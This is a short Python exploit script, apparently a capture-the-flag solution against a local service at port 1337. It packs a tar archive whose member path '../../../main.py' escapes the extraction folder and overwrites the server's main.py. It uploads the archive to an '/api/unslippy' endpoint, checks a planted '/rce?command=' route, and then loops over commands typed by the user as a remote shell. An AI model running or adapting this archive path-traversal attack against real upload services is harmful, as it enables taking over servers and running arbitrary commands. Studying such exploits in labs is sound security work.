import requests, time, tarfile

s = requests.session()

url = 'http://0.0.0.0:1337/api/unslippy'

tf = tarfile.open("tool_exploit/malcious.tar.gz", "w:gz")
tf.add("tool_exploit/main.py", "../../../main.py")
tf.close()

s.post(url, files={'file':open('tool_exploit/malcious.tar.gz','rb')})

time.sleep(2) # Wait for victim reload

res = s.get("http://0.0.0.0:1337/rce?command=echo exploit success").text
print(res)
if "exploit success" in res:
    while True:
        res = s.get(f"http://0.0.0.0:1337/rce?command={input('command: ')}").text
        print(res)
